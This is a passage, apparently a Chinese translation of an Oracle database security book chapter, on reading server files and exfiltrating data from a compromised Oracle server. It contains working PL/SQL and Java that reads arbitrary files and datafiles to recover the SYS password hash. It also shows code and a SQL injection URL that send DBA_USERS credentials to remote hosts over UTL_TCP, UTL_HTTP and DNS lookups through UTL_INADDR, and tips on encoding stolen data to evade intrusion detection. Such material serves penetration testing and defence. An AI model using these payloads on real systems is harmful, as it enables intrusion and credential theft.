title="使用Java访问文件系统"></a>使用Java访问文件系统</h3><p>使用 UTL_FILE 包访问文件系统要求用户有权访问 DIRECTORY 对象或创建 DIRECTORY 对象的权限。 使用 Java 不需要存在 DIRECTORY - 而是需要读写 java.io.FilePermission。 这可以通过调用 DBMS_JAVA.GRANT_PERMISSION 来授予：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;,</span><br><span class="line">&#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;read&#x27;);</span><br><span class="line"></span><br><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;,</span><br><span class="line">&#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;write&#x27;);</span><br></pre></td></tr></table></figure><p>以下代码使用户能够以 Oracle 用户的权限读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readfile(String filename) throws IOException</span><br><span class="line">        &#123;</span><br><span class="line">                FileReader f = new FileReader(filename);</span><br><span class="line">                BufferedReader fr = new BufferedReader(f);</span><br><span class="line">                String text = fr.readLine();;</span><br><span class="line">                while(text != null)</span><br><span class="line">                &#123;</span><br><span class="line">                        System.out.println(text);</span><br><span class="line">                        text = fr.readLine();</span><br><span class="line">                &#125;</span><br><span class="line">                fr.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADFILEPROC (p_filename IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADFILE.readfile (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">exec JAVAREADFILEPROC(&#x27;C:\boot.ini&#x27;)</span><br></pre></td></tr></table></figure><p>显然，前面的代码比使用 UTL_FILE 和使用那些讨厌的 DIRECTORY 对象调度要简洁得多。</p><h3 id="访问二进制文件"><a href="#访问二进制文件" class="headerlink" title="访问二进制文件"></a>访问二进制文件</h3><p>使用 Oracle 的 Java 访问基于二进制的文件有点奇怪——如果文件太大，它会使服务器的 CPU 以 100% 的速度旋转。 因此，在访问文件时，您需要以小块的形式进行。 以下代码将文件名作为其第一个参数，并将文件偏移量作为其第二个参数。 然后它从该偏移量中读取 512 个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SET ESCAPE ON</span><br><span class="line">SET ESCAPE &quot;\&quot;</span><br><span class="line">SET SERVEROUTPUT ON</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADBINFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADBINFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readbinfile(String f, int start) throws</span><br><span class="line">IOException</span><br><span class="line">      &#123;</span><br><span class="line">             FileInputStream fis;</span><br><span class="line">            DataInputStream dis;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                  int i;</span><br><span class="line">                  int ih,il;</span><br><span class="line">                  int cnt = 1, h=0,l=0;</span><br><span class="line">                  String hex[] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;,&quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;,</span><br><span class="line">&quot;8&quot;,&quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;,&quot; F&quot;&#125;;</span><br><span class="line"></span><br><span class="line">                  RandomAccessFile raf = new RandomAccessFile (f, &quot;r&quot;);</span><br><span class="line">                  raf.seek (start);</span><br><span class="line">                  for(i=0; i&lt;=512; i++)</span><br><span class="line">                  &#123;</span><br><span class="line"></span><br><span class="line">                        ih = il = raf.readByte() \&amp; 0xFF;</span><br><span class="line">                        h = ih &gt;&gt; 4;</span><br><span class="line">                        l = il \&amp; 0x0F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        System.out.print(&quot;\\\\x&quot; + hex[h] + hex[l]);</span><br><span class="line">                        if(cnt \% 16 == 0)</span><br><span class="line"></span><br><span class="line">                              System.out.println();</span><br><span class="line">                        cnt ++;</span><br><span class="line"></span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (EOFException eof)</span><br><span class="line">                  &#123;</span><br><span class="line">                  System.out.println();</span><br><span class="line">                  System.out.println(&quot;EOF reached &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException ioe)</span><br><span class="line">            &#123;</span><br><span class="line">                  System.out.println(&quot;IO error: &quot;+ ioe);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADBINFILEPROC (p_filename IN</span><br><span class="line">VARCHAR2, p_start in number)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADBINFILE.readbinfile (java.lang.String, int)&#x27;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>通过使用以下代码直接访问 Oracle 数据文件，您可以完全绕过数据库服务器强制执行的访问控制。 例如，以下输出显示访问 SYSTEM01.DBF 文件中存储 USER$ 表的部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">SQL&gt; exec</span><br><span class="line">JAVAREADBINFILEPROC(&#x27;C:\\oracle\\oradata\\orcl\\system01.DBF&#x27;,448767)</span><br><span class="line">\x53\x59\x53\x02\xC1\x02\x10\x30\x44\x34\x37\x42\x35\x35\x30\x43</span><br><span class="line">\x35\x46\x37\x30\x44\x45\x44\x01\x80\x02\xC1\x04\x07\x78\x69\x0A</span><br><span class="line">\x1B\x04\x3C\x23\x07\x78\x6A\x03\x11\x0E\x24\x12\xFF\xFF\x01\x80</span><br><span class="line">\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x09\x53\x59\x53\x5F\x47</span><br><span class="line">\x52\x4F\x55\x50\x6C\x00\x11\x05\x06\x53\x59\x53\x54\x45\x4D\x02</span><br><span class="line">\xC1\x02\x10\x44\x34\x44\x46\x37\x39\x33\x31\x41\x42\x31\x33\x30</span><br><span class="line">\x45\x33\x37\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x04\x3C\x23\x07</span><br><span class="line">\x78\x69\x0A\x1B\x04\x3C\x23\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF</span><br><span class="line">\xFF\x01\x80\x01\x80\x09\x53\x59\x53\x5F\x47\x52\x4F\x55\x50\x6C</span><br><span class="line">\x00\x11\x0E\x0C\x41\x51\x5F\x55\x53\x45\x52\x5F\x52\x4F\x4C\x45</span><br><span class="line">\x01\x80\xFF\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x05\x03\x3C\xFF</span><br><span class="line"></span><br><span class="line">\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x16\x44</span><br><span class="line">\x45\x46\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53\x55\x4D\x45\x52\x5F</span><br><span class="line">\x47\x52\x4F\x55\x50\xAC\x00\x01\x01\x00\x01\x00\x00\x40\x00\x36</span><br><span class="line">\x00\x0F\x00\x40\x00\x36\x00\x0F\x02\xC1\x10\x6C\x00\x11\x0D\x15</span><br><span class="line">\x41\x51\x5F\x41\x44\x4D\x49\x4E\x49\x53\x54\x52\x41\x54\x4F\x52</span><br><span class="line">\x5F\x52\x4F\x4C\x45\x01\x80\xFF\x01\x80\x01\x80\x07\x78\x69\x0A</span><br><span class="line">\x1B\x05\x03\x3C\xFF\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01</span><br><span class="line">\x80\x01\x80\x16\x44\x45\x46\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53</span><br><span class="line">\x55\x4D\x45\x52\x5F\x47\x52\x4F\x55\x50\xAC\x00\x01\x01\x00\x01</span><br><span class="line">\x00\x00\x40\x00\x36\x00\x0E\x00\x40\x00\x36\x00\x0E\x02\xC1\x0F</span><br><span class="line">\x6C\x00\x07\x05\x01\x80\x01\x80\x02\xC1\x61\x01\x80\x01\x80\x01</span><br><span class="line">\x80\x01\x80\x6C\x00\x11\x0C\x16\x52\x45\x43\x4F\x56\x45\x52\x59</span><br><span class="line">\x5F\x43\x41\x54\x41\x4C\x4F\x47\x5F\x4F\x57\x4E\x45\x52\x01\x80</span><br><span class="line">\xFF\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x05\x02\x2C\xFF\xFF\xFF</span><br><span class="line">\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x16\x44\x45\x46</span><br><span class="line">\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53\x55\x4D\x45\x52\x5F\x47\x52</span><br><span class="line">\x4F\x55\x50\xAC\x00\x01\x01\x00\x01\x00\x00\x40\x00\x36\x00\x0D</span><br></pre></td></tr></table></figure><p>如果您查看输出的第一行，前 3 个字节是 \x53\x59\x53 - 这是“SYS”。 跳过接下来的 4 个字节并取接下来的 16 个字节，您将得到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x30\x44\x34\x37\x42\x35\x35\x30\x43\x35\x46\x37\x30\x44\x45\x44&quot;</span><br></pre></td></tr></table></figure><p>这转换为“0D47B550C5F70DED”，它是 SYS 用户的密码哈希。 确认这一点，您可以运行以下选择：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select password from dba_users where username = &#x27;SYS&#x27;;</span><br><span class="line"></span><br><span class="line">PASSWORD</span><br><span class="line">------------------------------</span><br><span class="line">0D47B550C5F70DED</span><br></pre></td></tr></table></figure><p>可以将代码包装在循环中以提取整个数据文件。 有关这方面的更多信息，请参阅第 12 章中的“数据泄露”部分。</p><h3 id="使用操作系统环境变量"><a href="#使用操作系统环境变量" class="headerlink" title="使用操作系统环境变量"></a>使用操作系统环境变量</h3><p>Oracle 10g 在 DBMS_SYSTEM 包中引入了一个名为 GET_ENV 的过程。 此过程采用环境变量的名称并返回其值。 它不会返回 PATH 环境变量的值，但是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PROCEDURE DUMP_ENV AS</span><br><span class="line">BUFFER VARCHAR2(260);</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">        -- SYS.DBMS_SYSTEM.GET_ENV WON&#x27;T GIVE BACK THE</span><br><span class="line">        -- PATH ENVIRONMENT VARIABLE</span><br><span class="line"></span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;ORACLE_HOME&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;ORACLE_HOME: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;ORACLE_SID&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;ORACLE_SID: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;COMPUTERNAME&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;COMPUTERNAME: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;OS&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;OS: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;TEMP&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;TEMP: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;WINDIR&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;WINDIR: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;SYSTEMROOT&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;SYSTEMROOT: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROGRAMFILES&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROGRAMFILES: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;COMSPEC&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;COMSPEC: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROCESSOR_ARCHITECTURE&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROCESSOR_ARCHITECTURE: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROCESSOR_IDENTIFIER&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROCESSOR_IDENTIFIER: &#x27; || BUFFER);</span><br><span class="line"></span><br><span class="line">END DUMP_ENV;</span><br><span class="line">/</span><br><span class="line">EXEC DUMP_ENV;</span><br></pre></td></tr></table></figure><p>此过程产生以下输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ORACLE_HOME: C:\oracle\product\10.1.0\Db_1</span><br><span class="line">ORACLE_SID: orcl10g</span><br><span class="line">COMPUTERNAME: GLADIUS</span><br><span class="line">OS: Windows_NT</span><br><span class="line">TEMP: C:\WINDOWS\TEMP</span><br><span class="line">WINDIR: C:\WINDOWS</span><br><span class="line">SYSTEMROOT: C:\WINDOWS</span><br><span class="line">PROGRAMFILES: C:\Program Files</span><br><span class="line">COMSPEC: C:\WINDOWS\system32\cmd.exe</span><br><span class="line">PROCESSOR_ARCHITECTURE: x86</span><br><span class="line">PROCESSOR_IDENTIFIER: x86 Family 6 Model 9 Stepping 5, GenuineIntel</span><br></pre></td></tr></table></figure><h2 id="访问网络"><a href="#访问网络" class="headerlink" title="访问网络"></a>访问网络</h2><p>本章研究访问网络的目的是为了数据泄露以及从受感染的 Oracle 服务器攻击其他系统。</p><h3 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h3><p>数据泄露是在不被注意的情况下获取数据的过程。 这可能就像使用物理备份磁带一样简单，也可能像使用网络上的隐蔽通道一样复杂。 Joanna Rutkowska 开发了一种更复杂的隐蔽通道方法。 它被称为NUSHU，以中国妇女使用的一种古老的密语命名。 NUSHU，最近的一个，使用 TCP 初始序列号来隐藏加密数据。 虽然可以检测到 NUSHU（使用英国剑桥大学的 Steven J. Murdoch 和 Stephen Lewis 以及俄罗斯塔甘罗格州立大学的 Eugene Tumoian 和 Maxim Anikeev 开发的方法），但必须指出的是，这些方法是在 NUSHU 被开发之后才发表。</p><h4 id="使用-UTL-TCP"><a href="#使用-UTL-TCP" class="headerlink" title="使用 UTL_TCP"></a>使用 UTL_TCP</h4><p>UTL_TCP PL/SQL 包使 Oracle 服务器能够创建到指定 TCP 端口上的远程主机的出站连接。 因此，它是一种从数据库中提取数据的有用方法。 首先连接到给定主机上的给定 TCP 端口，然后一旦连接就可以传输数据。 不用说，如果 Oracle 服务器受到带有出口过滤功能的防火墙的保护，那么攻击者就需要确定哪些端口被允许出去。 这可以使用前面介绍的 TCP 端口扫描器来实现。 通常，远程管理端口（例如 22 (SSH) 和 3389（终端服务））以及网络基础设施端口（例如 TCP 53 (DNS)）通常是“开放的”。 发现可访问端口 25 (SMTP)、80 (HTTP) 和 443 (HTTPS) 的情况也并不少见。 以下代码演示了如何将 UTL_TCP 用作从数据库服务器提取数据的带外方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">TYPE C_TYPE IS REF CURSOR;</span><br><span class="line">CV C_TYPE;</span><br><span class="line">PASSWORD VARCHAR2(30);</span><br><span class="line">USERNAME VARCHAR2(30);</span><br><span class="line">C UTL_TCP.CONNECTION;</span><br><span class="line">L PLS_INTEGER;</span><br><span class="line">BEGIN</span><br><span class="line">C:= UTL_TCP.OPEN_CONNECTION(&#x27;192.168.0.10&#x27;,111,&#x27;US7ASCII&#x27;);</span><br><span class="line">OPEN CV FOR &#x27;SELECT USERNAME,PASSWORD FROM SYS.DBA_USERS&#x27;;</span><br><span class="line">LOOP</span><br><span class="line">      FETCH CV INTO USERNAME,PASSWORD;</span><br><span class="line">      L:=UTL_TCP.WRITE_LINE(C, USERNAME||&#x27;:&#x27;||PASSWORD);</span><br><span class="line">EXIT WHEN CV%NOTFOUND;</span><br><span class="line">END LOOP;</span><br><span class="line">CLOSE CV;</span><br><span class="line">UTL_TCP.CLOSE_CONNECTION(C);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>此代码连接到 192.168.0.10 上的 TCP 端口 111 (PortMapper)。 然后它从 DBA_USERS 中选择用户名和密码，将它们连接起来，然后通过网络发送它们。 然后连接关闭。 暂时忽略 DBMS_EXPORT_EXTENSION（参见第 5 章，“Oracle 和 PL/SQL”），像这样执行大块匿名 PL/SQL 大多只有在直接连接到数据库服务器时才可用； 它对 SQL 注入情况没有用。 然而，UTL_HTTP 可以。 我们接下来看看这个。</p><h4 id="使用-UTL-HTTP"><a href="#使用-UTL-HTTP" class="headerlink" title="使用 UTL_HTTP"></a>使用 UTL_HTTP</h4><p>UTL_HTTP 包可用于从 Oracle 数据库服务器向 Web 服务器发出带外请求。 请求函数接受一个 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_http.request(&#x27;http://192.168.0.100:5500/&#x27;||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;)) from dual;</span><br></pre></td></tr></table></figure><p>您可以在此处看到感兴趣的数据是 SYS 用户的密码。 选中后，它会发送到侦听 TCP 端口 5500 的远程 Web 服务器。 UTL_HTTP.REQUEST 在 SQL 注入场景中特别有用。 例如，假设一个应用程序正在连接 Oracle 后端，并且它容易受到搜索页面 FOO 参数中 SQL 注入的影响。 然后可以注入 UTL_HTTP.REQUEST 来窃取数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?FOO=BAR&#x27;||utl_http.request(&#x27;http://192.168.0.100:5500/&#x27;||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;))||&#x27;BAR</span><br></pre></td></tr></table></figure><p>其他可以非常有效地用于网络数据泄露的包是 UTL_MAIL、UTL_SMTP 和 UTL_INADDR。 特别令人感兴趣的是 UTL_INADDR，它可用于窃取伪装为 DNS 查询的数据。</p><h4 id="使用-DNS-查询和-UTL-INADDR"><a href="#使用-DNS-查询和-UTL-INADDR" class="headerlink" title="使用 DNS 查询和 UTL_INADDR"></a>使用 DNS 查询和 UTL_INADDR</h4><p>UTL_INADDR 包用于查找主机名和 IP 地址，并可用作另一种带外方法。如果服务器已配置了名称服务器（它们几乎总是如此！），则可以使用此包窃取数据。由于域名系统的工作方式，当名称服务器查询到它不知道的主机的 IP 地址时，它会将请求向上转发到负责相关域的名称服务器。例如，如果在连接到我的 ISP 时，我向我的 ISP 的名称服务器查询主机 xyzpqr.ngssoftware.com，那么如果它不在缓存中，它就会将请求转发到 NGS DNS服务器进行解析。 NGS DNS服务器将回复主机的 IP 地址——当然，如果它存在的话。如果您拥有<strong>DNS服务器</strong>，因此可以访问日志或能够捕获离线流量，那么您可以通过 UDP 端口 53 从数据库服务器发送数据 - 当然，假设防火墙设置允许数据库服务器名称查找。</p><p>执行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;)||&#x27;.ngssoftware.com&#x27;) FROM DUAL;</span><br></pre></td></tr></table></figure><p>导致服务器查询 0D47B550C5F70DED.ngssoftware.com：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 78</span><br><span class="line">      Identifier: 18150</span><br><span class="line">      Flags: 0x0000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 17 (UDP)</span><br><span class="line">      Checksum: 0x6a17</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 194.72.6.57</span><br><span class="line">UDP Header</span><br><span class="line">      Source port: 1309</span><br><span class="line">      Dest port: 53</span><br><span class="line">      Length: 58</span><br><span class="line">      Checksum: 0x2cce</span><br><span class="line">DNS Packet</span><br><span class="line">      Identification: 49</span><br><span class="line">      Flags: 0x0100</span><br><span class="line">            DNS Query</span><br><span class="line">            Standard Query</span><br><span class="line">            DNS Message was NOT truncated</span><br><span class="line">            RD (Recursion Desired)</span><br><span class="line">            Server does not support recursive queries</span><br><span class="line">      No. of Questions: 1</span><br><span class="line">      No. of Answer Resource Records: 0</span><br><span class="line">      No. of Name Server Resource Records: 0</span><br><span class="line">      No. Additional Resource Records: 0</span><br><span class="line">      Query Name : 0D47B550C5F70DED.ngssoftware.com</span><br><span class="line">            Query Type : A (Host Address)</span><br><span class="line">            Query Class : IN (Internet Class)</span><br></pre></td></tr></table></figure><p>该查询最终到达 NGS DNS服务器，因此可以被捕获。 使用 UTL_INADDR 时，主机名最长可达 254 个字节。 其中，许多字节将用于域 - 例如，ngssoftware.com。 此外，主机名的每个部分都限制为 64 个字符，其中最后一个必须是一个点。</p><p>同样，因为 UTL_INADDR 是一个函数，所以它在 SQL 注入场景中很有用。</p><h3 id="在泄露之前加密数据"><a href="#在泄露之前加密数据" class="headerlink" title="在泄露之前加密数据"></a>在泄露之前加密数据</h3><p>一些数据库入侵检测产品检查离开服务器的数据以确定它是否与给定的模式匹配 - 例如，个人身份信息 (PII)，如信用卡号或社会保险号。 为了避免触发警报，攻击者可能会在窃取数据之前混淆甚至加密数据。 任何嗅探网络线路的人只会看到看起来无辜的废话或随机字符串。 毋庸置疑，对某些人来说，这可能被视为妥协的证据，因此攻击者需要保持平衡。 以信用卡为例，寻找离开数据库服务器的此类数据的设备通常会被两个或多个卡号的简单串联所欺骗。 数字的每个字符都可以与一个常量相加 - 例如，0x20 - 使用字符 P 到 Y 使数字字符串成为字母字符串。也可以使用 DBMS_OBUSCATION_TOOLKIT、DBMS_CRYPTO 或 UTL_ENCODE 等包。 例如，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_encode.base64_encode((select password from dba_users where username = &#x27;SYS&#x27;)) from dual;</span><br></pre></td></tr></table></figure><p>结果是“30367274702B3268744B6F3D”的base64编码字符串。</p><p>另一种替代方法是使用 UTL_COMPRESS 的 LZ_COMPRESS 函数，该函数使用 Lempel-Ziv 压缩算法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_compress.lz_compress((select password from dba_users where username = &#x27;SYS&#x27;),6) from dual;</span><br></pre></td></tr></table></figure><p>生成字符串“1F8B080000000000000BBBBCEAEDF2B70BB7 